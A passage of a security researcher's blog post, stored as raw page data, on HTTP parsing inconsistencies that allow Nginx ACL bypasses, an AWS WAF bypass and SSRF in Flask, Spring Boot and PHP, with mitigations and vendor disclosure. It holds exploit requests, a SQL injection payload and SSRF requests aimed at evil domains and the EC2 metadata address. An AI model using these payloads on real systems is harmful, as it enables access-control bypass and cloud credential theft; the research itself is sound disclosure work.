Interpretation\",\"parentId\":\"268678d3-485e-49a1-89c3-048811a313e2\"},{\"__typename\":\"TableOfContentsItem\",\"id\":\"c40f232f-b920-4fda-9696-dcf62c980f49\",\"level\":2,\"slug\":\"php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation\",\"title\":\"PHP Built-in Web Server Case Study - SSRF Through Incorrect Pathname Interpretation\",\"parentId\":\"268678d3-485e-49a1-89c3-048811a313e2\"},{\"__typename\":\"TableOfContentsItem\",\"id\":\"79b3a29d-790b-405f-89b2-bfadc5a39975\",\"level\":2,\"slug\":\"how-to-prevent-1\",\"title\":\"How to prevent\",\"parentId\":\"268678d3-485e-49a1-89c3-048811a313e2\"},{\"__typename\":\"TableOfContentsItem\",\"id\":\"9eca8c72-0edf-49bf-8996-76be2ee82761\",\"level\":1,\"slug\":\"http-desync-cache-poisoning-attacks\",\"title\":\"HTTP Desync Cache Poisoning Attacks\",\"parentId\":null},{\"__typename\":\"TableOfContentsItem\",\"id\":\"73d5400e-1c74-4ecf-92d6-6cbecd247573\",\"level\":2,\"slug\":\"cache-keys\",\"title\":\"Cache Keys\",\"parentId\":\"9eca8c72-0edf-49bf-8996-76be2ee82761\"},{\"__typename\":\"TableOfContentsItem\",\"id\":\"81f4c133-20bb-4d3e-afcf-117cf80024c6\",\"level\":2,\"slug\":\"s3-http-desync-cache-poisoning-issue\",\"title\":\"S3 HTTP Desync Cache Poisoning Issue\",\"parentId\":\"9eca8c72-0edf-49bf-8996-76be2ee82761\"},{\"__typename\":\"TableOfContentsItem\",\"id\":\"7ec99b8e-175c-4a52-aa2f-84d419d9ec8e\",\"level\":3,\"slug\":\"the-vulnerability\",\"title\":\"The Vulnerability\",\"parentId\":\"81f4c133-20bb-4d3e-afcf-117cf80024c6\"},{\"__typename\":\"TableOfContentsItem\",\"id\":\"b8bf3109-7624-4bf1-a074-a1c3d0bd7727\",\"level\":1,\"slug\":\"conclusion\",\"title\":\"Conclusion\",\"parentId\":null}]},\"badges\":{\"isEnabled\":true,\"items\":[{\"id\":\"5f741eac07891b4f5b9ec8cd\",\"type\":\"FEATURED_HASHNODE\"}]}},\"isAutoPublishedFromRSS\":false,\"authenticatedUserLikes\":{\"edges\":[]},\"isShadowBanned\":false,\"isAskMeAnything\":false},\"staticPage\":null}","totalUsersWhoLikedArticle":27,"integrations":{"fbPixelID":null,"fathomSiteID":null,"fathomCustomDomainEnabled":null,"fathomCustomDomain":null,"hotjarSiteID":null,"matomoSiteID":null,"matomoURL":null,"gaTrackingID":null,"plausibleAnalyticsEnabled":null,"domainURL":"rafa.hashnode.dev"},"rootLayout":{"legacyPublicationJSON":"{\"_id\":\"6488d69906c1659c6d332ff6\",\"author\":{\"_id\":\"6488d661432e5a15756c1a03\",\"name\":\"Rafael da Costa Santos\",\"photo\":\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686786296994/qxI_lhzL_.gif\",\"username\":\"rafax00\"},\"badgePageEnabled\":false,\"description\":\"This is my security research blog!\\n\",\"domain\":\"\",\"domainStatus\":{},\"wwwPrefixedDomainStatus\":{},\"customCSSEnabled\":false,\"customCSSPublished\":{\"homeMin\":\"\",\"postMin\":\"\",\"staticMin\":\"\"},\"customRules\":[],\"darkModeEnabled\":false,\"darkModeLogo\":\"\",\"disableFooterBranding\":false,\"isSubscriptionModalDisabled\":false,\"displayTitle\":\"\",\"favicon\":\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686748925239/Z6OQdUJ0q.gif\",\"gaTrackingID\":\"\",\"hasBadges\":true,\"headerColor\":\"#0f172a\",\"hideMembersPage\":true,\"isTeam\":false,\"layout\":\"grid\",\"menu\":[{\"_id\":\"648deaa267a3e6fc49d12f9e\",\"label\":\"sponsor me\",\"priority\":0,\"type\":\"link\",\"url\":\"https://rafa.hashnode.dev/sponsor\"}],\"metaHTML\":\"\u003cp\u003eThis is my security research blog!\u003c/p\u003e\\n\",\"metaHTMLSanitized\":\"This is my security research blog!\\n\",\"newsletterEnabled\":true,\"newsletterPageEnabled\":false,\"ogImage\":\"https://cdn.hashnode.com/res/hashnode/image/upload/v1687022404075/tXTvi1WB-.gif\",\"logo\":\"\",\"textSelectionSharerEnabled\":true,\"title\":\"Rafa's Blog\",\"urlPattern\":\"simple\",\"username\":\"rafa\",\"viewCountVisible\":false,\"readTimeHidden\":true,\"links\":{\"twitter\":\"https://twitter.com/rafabyte_\",\"instagram\":\"\",\"github\":\"https://github.com/rafax00\",\"website\":\"\",\"hashnode\":\"https://hashnode.com/@rafax00\",\"youtube\":\"\",\"dailydev\":\"\",\"linkedin\":\"https://www.linkedin.com/in/rafael-da-costa-santos-9685a5172/\",\"mastodon\":\"\"},\"numPosts\":3,\"sponsorship\":{\"content\":\"\u003cp\u003eIf you've found value in my blog and would like to support its continued growth, I invite you to consider becoming a sponsor. By sponsoring my blog, you can make a direct and meaningful impact on the quality and frequency of the content I provide.\u003c/p\u003e\\n\",\"contentMarkdown\":\"If you've found value in my blog and would like to support its continued growth, I invite you to consider becoming a sponsor. By sponsoring my blog, you can make a direct and meaningful impact on the quality and frequency of the content I provide.\"},\"stripe\":{\"connected\":true,\"accountId\":\"acct_1NK2WzIqhGEy5ZXI\",\"country\":\"BR\"},\"umamiWebsiteUUID\":\"0a9b6a2b-0d1f-4a14-a038-28d183bdfe8b\",\"allowContributorEdits\":true}","legacyPostJSON":"{\"_id\":\"648dec85578b47894c6af863\",\"partOfPublication\":true,\"author\":{\"_id\":\"6488d661432e5a15756c1a03\",\"name\":\"Rafael da Costa Santos\",\"photo\":\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686786296994/qxI_lhzL_.gif\",\"username\":\"rafax00\",\"bio\":\"\u003cp\u003eI'm Rafael, a Cybersecurity Analyst at SiDi with a strong focus on web applications. With a solid background in cybersecurity and a passion for uncovering vulnerabilities, I also have had the privilege of working with several Big Tech companies through Bug Bounty programs.\u003c/p\u003e\\n\",\"socialMedia\":{\"website\":\"\",\"github\":\"https://github.com/rafax00\",\"twitter\":\"\",\"facebook\":\"\",\"stackoverflow\":\"\",\"linkedin\":\"https://www.linkedin.com/in/rafael-da-costa-santos-9685a5172/\"},\"isDeactivated\":false},\"bookmarkedIn\":[],\"publication\":{\"_id\":\"6488d69906c1659c6d332ff6\",\"author\":{\"_id\":\"6488d661432e5a15756c1a03\",\"name\":\"Rafael da Costa Santos\",\"photo\":\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686786296994/qxI_lhzL_.gif\",\"username\":\"rafax00\"},\"badgePageEnabled\":false,\"description\":\"This is my security research blog!\\n\",\"domain\":\"\",\"domainStatus\":{},\"wwwPrefixedDomainStatus\":{},\"customCSSEnabled\":false,\"customCSSPublished\":{\"homeMin\":\"\",\"postMin\":\"\",\"staticMin\":\"\"},\"customRules\":[],\"darkModeEnabled\":false,\"darkModeLogo\":\"\",\"disableFooterBranding\":false,\"isSubscriptionModalDisabled\":false,\"displayTitle\":\"\",\"favicon\":\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686748925239/Z6OQdUJ0q.gif\",\"gaTrackingID\":\"\",\"hasBadges\":true,\"headerColor\":\"#0f172a\",\"hideMembersPage\":true,\"isTeam\":false,\"layout\":\"grid\",\"menu\":[{\"_id\":\"648deaa267a3e6fc49d12f9e\",\"label\":\"sponsor me\",\"priority\":0,\"type\":\"link\",\"url\":\"https://rafa.hashnode.dev/sponsor\"}],\"metaHTML\":\"\u003cp\u003eThis is my security research blog!\u003c/p\u003e\\n\",\"metaHTMLSanitized\":\"This is my security research blog!\\n\",\"newsletterEnabled\":true,\"newsletterPageEnabled\":false,\"ogImage\":\"https://cdn.hashnode.com/res/hashnode/image/upload/v1687022404075/tXTvi1WB-.gif\",\"logo\":\"\",\"textSelectionSharerEnabled\":true,\"title\":\"Rafa's Blog\",\"urlPattern\":\"simple\",\"username\":\"rafa\",\"viewCountVisible\":false,\"readTimeHidden\":true,\"links\":{\"twitter\":\"https://twitter.com/rafabyte_\",\"instagram\":\"\",\"github\":\"https://github.com/rafax00\",\"website\":\"\",\"hashnode\":\"https://hashnode.com/@rafax00\",\"youtube\":\"\",\"dailydev\":\"\",\"linkedin\":\"https://www.linkedin.com/in/rafael-da-costa-santos-9685a5172/\",\"mastodon\":\"\"},\"numPosts\":3,\"sponsorship\":{\"content\":\"\u003cp\u003eIf you've found value in my blog and would like to support its continued growth, I invite you to consider becoming a sponsor. By sponsoring my blog, you can make a direct and meaningful impact on the quality and frequency of the content I provide.\u003c/p\u003e\\n\",\"contentMarkdown\":\"If you've found value in my blog and would like to support its continued growth, I invite you to consider becoming a sponsor. By sponsoring my blog, you can make a direct and meaningful impact on the quality and frequency of the content I provide.\"},\"stripe\":{\"connected\":true,\"accountId\":\"acct_1NK2WzIqhGEy5ZXI\",\"country\":\"BR\"},\"umamiWebsiteUUID\":\"0a9b6a2b-0d1f-4a14-a038-28d183bdfe8b\",\"allowContributorEdits\":true},\"tags\":[{\"_id\":\"56744721958ef13879b94c04\",\"slug\":\"http\",\"name\":\"http\",\"isActive\":true,\"isApproved\":true},{\"_id\":\"5f2e70c0b8ac395b1f23a6cb\",\"slug\":\"cybersecurity-1\",\"name\":\"#cybersecurity\",\"isActive\":true,\"isApproved\":true},{\"_id\":\"56744723958ef13879b952cb\",\"slug\":\"research\",\"name\":\"research\",\"isActive\":true,\"isApproved\":true},{\"_id\":\"56744722958ef13879b94f40\",\"slug\":\"web\",\"name\":\"web\",\"isActive\":true,\"isApproved\":true},{\"_id\":\"6491b91ec167b41645fd218f\",\"slug\":\"desync-attacks\",\"name\":\"Desync Attacks\",\"isActive\":true,\"isApproved\":true}],\"coAuthors\":[],\"responseCount\":4,\"replyCount\":2,\"contentMarkdown\":\"The HTTP protocol plays a vital role in the seamless functioning of web applications, however, the implementation of HTTP parsers across different technologies can introduce subtle discrepancies, leading to potential security loopholes.\\n\\nIn this research, my focus revolves around the discovery of inconsistencies within HTTP parsers across various web technologies, including load balancers, reverse proxies, web servers, and caching servers. By investigating these disparities, I aim to shed light on potential new vulnerabilities that involve HTTP Desync attacks.\\n\\nIt was my first security research, I started on this journey in December 2021 and concluded in April 2022. I tried to be creative in finding new attack vectors due to incorrect HTTP parsing. In this post, I will share the final results of this study.\\n\\n# Pathname Manipulation: Bypassing Reverse Proxies and Load Balancers Security Rules\\n\\nThis section of the research focuses on the exploitable vulnerabilities arising from pathname manipulation in web servers, principally about the use of `trim()` or `strip()` functions. By exploiting these techniques, attackers can circumvent security rules specific to certain paths in reverse proxies and load balancers, posing a significant threat to web application security.\\n\\nIn this section, we delve into the intricacies of how web servers process and manipulate pathnames, investigating the impact of the removal of certain characters, which can lead to unintended behaviors.\\n\\n## Nginx ACL Rules\\n\\nNginx is a powerful web server and reverse proxy which allows developers to apply security rules on HTTP requests. This section explores security threads of the capabilities of Nginx in rewriting or blocking HTTP messages, with a primary focus on rules triggered by specific strings or regular expressions found within the HTTP pathname section.\\n\\nIn Nginx, the \\\"location\\\" rule enables developers to define specific directives and behaviors based on the requested URL. This rule acts as a key component in routing and processing incoming HTTP requests, allowing control over how different URLs are handled.\\n\\n```plaintext\\nlocation = /admin {\\n    deny all;\\n}\\n\\nlocation = /admin/ {\\n    deny all;\\n}\\n```\\n\\nThe above Nginx rule aims to deny every access to the `/admin` endpoint, so if a user tries to access this endpoint, Nginx will return `403` and will not pass the HTTP message to the web server.\\n\\nTo prevent security issues on URI-based rules, Nginx performs path normalization before checking them. Path normalization in Nginx refers to the process of transforming and standardizing requested URLs to a consistent and canonical format before handling them. It involves removing redundant or unnecessary elements from the URL path, such as extra slashes, dot segments, processing path traversal, and URL-encoded characters, to ensure uniformity and proper routing within the web server.\\n\\n## Trim Inconsistencies\\n\\nBefore we proceed, we need to understand what the `trim()` function does in different languages.\\n\\nDifferent languages remove different characters when the correspondent function for `trim()` is called. Each server will normalize the pathname based on its `trim()`, removing different characters. But Nginx which is written in C, does not cover all characters for all languages.\\n\\nE.g.: Python removes the character `\\\\x85` with `strip()`, and JavaScript does not with `trim()`.\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686750781066/bf6a391a-2bf5-4605-9e5e-8cc0f059a995.png align=\\\"center\\\")\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686750895455/784cf8a4-b070-4bb6-abd0-12ae887d568c.png align=\\\"center\\\")\\n\\nIf an HTTP message is parsed using the `trim()` function in different languages, an HTTP Desync attack can occur.\\n\\n## Bypassing Nginx ACL Rules With Node.js\\n\\nLet's consider the following Nginx ACL rule and Node.js API source code using Express:\\n\\n```plaintext\\nlocation = /admin {\\n    deny all;\\n}\\n\\nlocation = /admin/ {\\n    deny all;\\n}\\n```\\n\\n```javascript\\napp.get('/admin', (req, res) =\u003e {\\n    return res.send('ADMIN');\\n});\\n```\\n\\nFollowing the `trim()` logic, Node.js \\\"ignores\\\" the characters `\\\\x09`, `\\\\xa0`, and `\\\\x0c` from the pathname, but Nginx considers them as part of the URL:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686751453300/0531fc1a-9599-4a00-aa94-21cca2db557c.png align=\\\"center\\\")\\n\\n* First, Nginx receives the HTTP request and performs path normalization on the pathname;\\n    \\n* As Nginx includes the character `\\\\xa0` as part of the pathname, the ACL rule for the `/admin` URI will not be triggered. Consequently, Nginx will forward the HTTP message to the backend;\\n    \\n* When the URI `/admin\\\\x0a` is received by the Node.js server, the character `\\\\xa0` will be removed, allowing successful retrieval of the `/admin` endpoint.\\n    \\n\\nBelow is a graphical demonstration of what happens with the HTTP request:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686752151660/84ec1c49-2df9-4a44-ab01-1d798ef0564f.png align=\\\"center\\\")\\n\\nTo gain a clearer understanding of how this vulnerability can be exploited, I recommend watching the accompanying proof of concept video below:\\n\\n%[https://www.youtube.com/watch?v=sgs3s5oTfz8] \\n\\nBelow is a table correlating Nginx versions with characters that can potentially lead to bypassing URI ACL rules when using Node.js as the backend:\\n\\n| Nginx Version | **Node.js Bypass Characters** |\\n| --- | --- |\\n| 1.22.0 | `\\\\xA0` |\\n| 1.21.6 | `\\\\xA0` |\\n| 1.20.2 | `\\\\xA0`, `\\\\x09`, `\\\\x0C` |\\n| 1.18.0 | `\\\\xA0`, `\\\\x09`, `\\\\x0C` |\\n| 1.16.1 | `\\\\xA0`, `\\\\x09`, `\\\\x0C` |\\n\\n## Bypassing Nginx ACL Rules With Flask\\n\\nFlask removes the characters `\\\\x85`, `\\\\xA0`, `\\\\x1F`, `\\\\x1E`, `\\\\x1D`, `\\\\x1C`, `\\\\x0C`, `\\\\x0B`, and `\\\\x09` from the URL path, but NGINX doesn't.\\n\\nTake the following nginx configuration/API source code as a reference:\\n\\n```plaintext\\nlocation = /admin {\\n    deny all;\\n}\\n\\nlocation = /admin/ {\\n    deny all;\\n}\\n```\\n\\n```python\\n@app.route('/admin', methods = ['GET'])\\ndef admin():\\n    data = {\\\"url\\\":request.url, \\\"admin\\\":\\\"True\\\"}\\n\\n    return Response(str(data), mimetype=\\\"application/json\\\")\\n```\\n\\nAs you can see below, it's possible to circumvent the ACL protection by adding the character `\\\\x85` at the end of the pathname:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686753386536/4032be9b-c7f3-48ae-8074-5d9ad1f9e7a5.png align=\\\"center\\\")\\n\\n| Nginx Version | **Flask Bypass Characters** |\\n| --- | --- |\\n| 1.22.0 | `\\\\x85`, `\\\\xA0` |\\n| 1.21.6 | `\\\\x85`, `\\\\xA0` |\\n| 1.20.2 | `\\\\x85`, `\\\\xA0`, `\\\\x1F`, `\\\\x1E`, `\\\\x1D`, `\\\\x1C`, `\\\\x0C`, `\\\\x0B` |\\n| 1.18.0 | `\\\\x85`, `\\\\xA0`, `\\\\x1F`, `\\\\x1E`, `\\\\x1D`, `\\\\x1C`, `\\\\x0C`, `\\\\x0B` |\\n| 1.16.1 | `\\\\x85`, `\\\\xA0`, `\\\\x1F`, `\\\\x1E`, `\\\\x1D`, `\\\\x1C`, `\\\\x0C`, `\\\\x0B` |\\n\\n## Bypassing Nginx ACL Rules With Spring Boot\\n\\nSpring removes the characters `\\\\x09` and `\\\\x3B` from the URL path, but Nginx doesn't.\\n\\nTake the following Nginx configuration/API source code as a reference:\\n\\n```plaintext\\nlocation = /admin {\\n    deny all;\\n}\\n\\nlocation = /admin/ {\\n    deny all;\\n}\\n```\\n\\n```java\\n@GetMapping(\\\"/admin\\\")\\npublic String admin() {\\n    return \\\"Greetings from Spring Boot!\\\";\\n}\\n```\\n\\nBelow, you will find a demonstration of how ACL protection can be circumvented by adding the character `\\\\x09` or `\\\\t` at the end of the pathname:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686753921718/b3f91ea3-558f-4889-860c-15cdc02cb7f6.png align=\\\"center\\\")\\n\\n| Nginx Version | **Spring Boot Bypass Characters** |\\n| --- | --- |\\n| 1.22.0 | `;` |\\n| 1.21.6 | `;` |\\n| 1.20.2 | `\\\\x09`, `;` |\\n| 1.18.0 | `\\\\x09`, `;` |\\n| 1.16.1 | `\\\\x09`, `;` |\\n\\n## Bypassing Nginx ACL Rules With PHP-FPM Integration\\n\\nPHP-FPM (FastCGI Process Manager) is a robust and high-performance PHP FastCGI implementation that works seamlessly with Nginx. It serves as a standalone server for handling PHP requests, improving the speed and efficiency of PHP execution. Nginx acts as a reverse proxy, receiving incoming HTTP requests and passing them to PHP-FPM for processing.\\n\\nLet's consider the following Nginx FPM configuration:\\n\\n```plaintext\\nlocation = /admin.php {\\n    deny all;\\n}\\n\\nlocation ~ \\\\.php$ {\\n    include snippets/fastcgi-php.conf;\\n    fastcgi_pass unix:/run/php/php8.1-fpm.sock;\\n}\\n```\\n\\nWhen two `.php` files are in the same pathname of the HTTP request, PHP will match the first one, ignoring everything after the slash. Since the Nginx is configured to block requests to the specific endpoint `/admin.php`, it's possible to access the admin.php file by doing the following request:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686758750001/66ac562a-7da9-4397-a76a-1d641474e000.png align=\\\"center\\\")\\n\\nBelow is a graphical example of how the applications interpret the HTTP request:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686758967146/03073365-9dbf-4cf5-8762-1d705c9a038c.png align=\\\"center\\\")\\n\\nThis technique only works if the second PHP file, in this case, `index.php`, exists in the server structure. Take the following server code/structure as a reference:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686758832956/d0708099-48e0-46d0-b646-8bb92c51454a.png align=\\\"center\\\")\\n\\nThese behaviors were reported to the Nginx security team in 2022, and they responded by saying that they don't have responsibility for it.\\n\\nSince the research concluded in April 2022, newer versions of Nginx were not specifically tested. However, it is highly likely that the findings and vulnerabilities identified in the research are reproducible in the latest version of Nginx as well.\\n\\n## How to prevent\\n\\nTo prevent these issues, you must use the `~` expression Instead of the `=` expression on Nginx ACL rules, for example:\\n\\n```plaintext\\nlocation ~* ^/admin {\\n    deny all;\\n}\\n```\\n\\nThe `~` expression matches the string `/admin` in any part of the pathname, in other words, if a user sent a request to `/admin1337`, the request will also be blocked.\\n\\n# Bypassing AWS WAF ACL\\n\\n## How AWS WAF ACLs Work\\n\\nAWS ACL (Access Control List) rules are a component of load balancers, providing control over incoming and outgoing network traffic. These rules define access permissions based on specified conditions, allowing or denying requests to and from the load balancer.\\n\\nYou can configure the AWS Web Application Firewall (WAF) ACL to examine and validate HTTP headers. AWS WAF ACL rules allow you to define conditions based on specific header attributes or values, enabling you to control and filter incoming requests.\\n\\nHeader ACL example:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686762641000/8f9c4e41-c17a-48d6-b2f5-72d76217e337.png align=\\\"center\\\")\\n\\nIn the above example, if a request contains a SQL Injection payload in the `X-Query` header, AWS WAF recognizes the SQL Injection attempt and responds with a `403 Forbidden` HTTP status code. This prevents the request from being forwarded to the backend, effectively blocking any potential exploitation of the application's database through SQL Injection attacks.\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686763561032/d592bd74-2618-461d-9768-314549b691cf.png align=\\\"center\\\")\\n\\nAs you can see, the above request carried the payload `' or '1'='1' --` at the `X-Query` header, and then was blocked by the AWS WAF.\\n\\n## Bypassing AWS WAF ACL With Line Folding\\n\\nWeb servers like Node.js, Flask and many others sometimes encounter a phenomenon known as \\\"line folding.\\\" Line folding refers to the practice of splitting long header values using the characters \\\\\\\\x09 (tab) and \\\\\\\\x20 (space) into multiple lines for readability. However, this behavior can lead to compatibility issues and potential security vulnerabilities.\\n\\nFor example, the header `1337: Value\\\\r\\\\n\\\\t1337` in the following request will be interpreted as `1337: Value\\\\t1337` in the Node.js server:\\n\\n```http\\nGET / HTTP/1.1\\nHost: target.com\\n1337: Value\\n    1337\\nConnection: close\\n```\\n\\nKnowing it, I discovered that it's possible to bypass the AWS WAF by using line folding behavior.\\n\\nUsing the same AWS WAF that protects the `X-Query` from SQL Injection payloads, the following HTTP request was used to confirm that the Node.js server received the payload `' or '1'='1' --` in the `X-Query` header.\\n\\nBelow is a graphical example of how the applications interpret the HTTP request header with line folding:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686765599948/440f51b0-18bb-451c-92da-3428000cd7f0.png align=\\\"center\\\")\\n\\nFor the exploitation scenario, let's take the following Node.js source code as a reference. It will return the requested headers as a Json:\\n\\n```javascript\\napp.get('/*', (req, res) =\u003e {\\n    res.send(req.headers);\\n});\\n```\\n\\nBelow is an example of an exploitation request:\\n\\n```http\\nGET / HTTP/1.1\\\\r\\\\n\\nHost: target.com\\\\r\\\\n\\nX-Query: Value\\\\r\\\\n\\n\\\\t' or '1'='1' -- \\\\r\\\\n\\nConnection: close\\\\r\\\\n\\n\\\\r\\\\n\\n```\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686765362775/dbd69c56-503e-45bb-ada6-358d3d987ede.png align=\\\"center\\\")\\n\\nIn the provided screenshot, it is evident that the Node.js application interpreted the characters `' or '1'='1' --` as the value for the `X-Query` header. However, the AWS WAF treated it as a header name instead.\\n\\nThis bypass technique was reported to the AWS security team and fixed in 2022.\\n\\n# Incorrect Path Parsing Leads to Server-Side Request Forgery\\n\\nIn the previous sections, I provided reasons to be cautious about trusting reverse proxies. However, in this section, I will demonstrate why utilizing a reverse proxy can be advantageous...\\n\\nIn this section, I will leverage an incorrect pathname interpretation to exploit a Server-Side Request Forgery vulnerability in popular servers and frameworks such as Spring Boot, Flask, and PHP.\\n\\nNormally, a valid HTTP pathname starts with `/` or `http(s)://domain/`, but the majority of the popular WEB servers do not verify it correctly, which can lead to a security risk.\\n\\n## SSRF on Flask Through Incorrect Pathname Interpretation\\n\\nFlask is a lightweight web framework for Python, and it offers a straightforward and flexible approach to web development.\\n\\nAfter conducting tests on Flask's pathname parsing, I discovered that it accepts certain characters that it shouldn't. As an example, the following HTTP request, which should be considered invalid, is surprisingly treated as valid by the framework, but the server responds `404 Not Found`:\\n\\n```http\\nGET @/ HTTP/1.1\\nHost: target.com\\nConnection: close\\n```\\n\\nWhile investigating how this behavior can potentially result in a security vulnerability, I came across a helpful [Medium blog post](https://medium.com/@zwork101/making-a-flask-proxy-server-online-in-10-lines-of-code-44b8721bca6) that demonstrates the creation of a proxy using the Flask framework. Below is an example of the code provided in the blog post:\\n\\n```python\\nfrom flask import Flask\\nfrom requests import get\\n\\napp = Flask('__main__')\\nSITE_NAME = 'https://google.com/'\\n\\n@app.route('/', defaults={'path': ''})\\n@app.route('/\u003cpath:path\u003e')\\ndef proxy(path):\\n  return get(f'{SITE_NAME}{path}').content\\n\\napp.run(host='0.0.0.0', port=8080)\\n```\\n\\nMy first thought was: \\\"*What if the developer forgets to add the last slash in the* `SITE_NAME` *variable?*\\\". And yes, it can lead to an SSRF.\\n\\nSince Flask also allows any ASCII character after the `@`, it's possible to fetch an arbitrary domain after concatenating the malicious pathname and the destination server.\\n\\nPlease consider the following source code as a reference for the exploitation scenario:\\n\\n```python\\nfrom flask import Flask\\nfrom requests import get\\n\\napp = Flask('__main__')\\nSITE_NAME = 'https://google.com'\\n\\n@app.route('/', defaults={'path': ''})\\n@app.route('/\u003cpath:path\u003e')\\n\\ndef proxy(path):\\n  return get(f'{SITE_NAME}{path}').content\\n\\nif __name__ == \\\"__main__\\\":\\n    app.run(threaded=False)\\n```\\n\\nPresented below is an example of an exploitation request:\\n\\n```http\\nGET @evildomain.com/ HTTP/1.1\\nHost: target.com\\nConnection: close\\n```\\n\\nIn the following example, I was able to fetch my EC2 metadata:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686771183056/fe166abf-b2cb-41be-846b-11ac56b33d71.png align=\\\"center\\\")\\n\\n## SSRF on Spring Boot Through Incorrect Pathname Interpretation\\n\\nUpon discovering the presence of an SSRF vulnerability in Flask, I delved into exploring how this behavior could be exploited in other frameworks. As my research progressed, it became apparent that Spring Boot is also susceptible to this particular issue.\\n\\nAuthentication bypasses, ACL bypasses, and path traversal are known vectors when the application parses Matrix parameters. Servlet matrix parameters are a feature introduced in the Servlet specification that allows you to extract and handle additional data present in the URL path. Unlike query parameters that are separated by the `?` character, matrix parameters are separated by the `;` character within the URL.\\n\\nDuring the research, I discovered that the Spring framework accepts the matrix parameter separator character `;` before the first slash of the HTTP pathname:\\n\\n```http\\nGET ;1337/api/v1/me HTTP/1.1\\nHost: target.com\\nConnection: close\\n```\\n\\nIf a developer implements a server-side request that utilizes the complete pathname of the request to fetch an endpoint, it can lead to the emergence of Server-Side Request Forgery (SSRF).\\n\\nPlease consider the following source code as a reference for the exploitation scenario:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686772007869/5661fff8-9e48-4c63-b78b-cb69ee0582c0.png align=\\\"center\\\")\\n\\nThe code snippet above utilizes the `HttpServletRequest` API to retrieve the requested URL through the `getRequestURI()` function. Subsequently, it concatenates the requested URI with the destination endpoint http://ifconfig.me.\\n\\nConsidering that Spring permits any character following the Matrix parameter separator, becoming possible to use the `@` character to fetch an arbitrary endpoint as well.\\n\\nBelow is an example of the exploit request:\\n\\n```http\\nGET ;@evil.com/url HTTP/1.1\\nHost: target.com\\nConnection: close\\n```\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686772361453/e66a9edf-a590-4d82-b75a-180c33ae1a21.png align=\\\"center\\\")\\n\\n## PHP Built-in Web Server Case Study - SSRF Through Incorrect Pathname Interpretation\\n\\nThe PHP Built-in web server suffers from the same vulnerability. Still, the Built-in server is not used in production involvements, so I decided to present this behavior as a case study that is unlikely to happen in real-world applications.\\n\\nSurprisingly, PHP allows the asterisk `*` character before the first slash in the pathname, and between the asterisk and the first slash, almost all ASCII characters are accepted as valid HTTP request.\\n\\nHowever, there are two limitations that arise with PHP:\\n\\n1. This technique can only be used for the root pathname `/` and cannot be applied to other endpoints, in other words, the vulnerable code must be in the `index.php` file;\\n    \\n2. Dots `.` are not allowed before the first slash, which restricts the inclusion of arbitrary IPs and domains, to circumvent it, the payload must include a dotless-hex encoded IP address of the malicious domain.\\n    \\n\\nLet's consider the following PHP code for this exploitation scenario:\\n\\n```php\\n\u003c?php\\n$site = \\\"http://ifconfig.me\\\";\\n$current_uri = $_SERVER['REQUEST_URI'];\\n\\n$proxy_site = $site.$current_uri;\\nvar_dump($proxy_site);\\n\\necho \\\"\\\\n\\\\n\\\";\\n\\n$response = file_get_contents($proxy_site);\\nvar_dump($response);\\n?\u003e\\n```\\n\\nThe provided code retrieves the HTTP request pathname using `$_SERVER['REQUEST_URI']` and concatenates it with the destination domain.\\n\\nFor performing IP address dotless-hex encoding, you can utilize the tool [ip-encoder.py](https://gist.github.com/mhmdiaa/2587e2330b87db99c81ace2a190e235f).\\n\\nThe resulting payload used for exploiting which fetches the EC2 metadata is as follows:\\n\\n```http\\nGET *@0xa9fea9fe/ HTTP/1.1\\nHost: target.com\\nConnection: close\\n```\\n\\nIn the following proof of concept, I successfully retrieved my EC2 metadata:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686789542807/4ca585ed-37e3-4384-bec0-ba2c6e59e75a.png align=\\\"center\\\")\\n\\n## How to prevent\\n\\n* It is essential to consistently employ complete URL domains when concatenating them with user input. For instance, ensure that a trailing slash is added after the domain name, such as `http://ifconfig.me/`.\\n    \\n* Utilizing a reverse proxy that effectively handles HTTP requests. The vulnerabilities mentioned are typically only possible if the framework is used without any additional reverse proxy that verifies the HTTP pathname. In other words, incorporating a reverse proxy can significantly enhance the security of the web application.\\n    \\n\\n# HTTP Desync Cache Poisoning Attacks\\n\\nInconsistencies exist among servers and reverse proxies when it comes to removing invalid invisible characters from header names before interpreting them. This inconsistency can lead to notable vulnerabilities, such as HTTP Request Smuggling. But in this section, I will discuss a vulnerability and technique that I discovered during my research that combines Desync attacks with Cache Poisoning, which affects cache servers when integrated with AWS S3 buckets.\\n\\nBut before we continue, we must understand some functionalities of cache servers.\\n\\n## Cache Keys\\n\\nCache keys are unique identifiers used by cache servers to store and retrieve cached data, they serve as references or labels that allow access to cached content.\\n\\nThe most frequently used cache key is typically derived from the URL's pathname. When a user sends a request to a server that utilizes caching, the cache server employs the requested URL to locate the corresponding cached response to serve back to the user.\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686943618847/430c595b-b7ca-4dec-b31c-58374b1d0a30.webp align=\\\"center\\\")\\n\\nIn addition to the URL's pathname, another default cache key is the Host header. Let's consider a scenario where a cached JavaScript file is located at `https://target.com/static/main.js`. When a user sends an HTTP request to this cached URL, the cache server will return the stored response without having to forward the request to the backend server.\\n\\nHowever, if a user sends an HTTP request to the same endpoint but modifies the Host header to `1337.target.com`, the cache server will attempt to 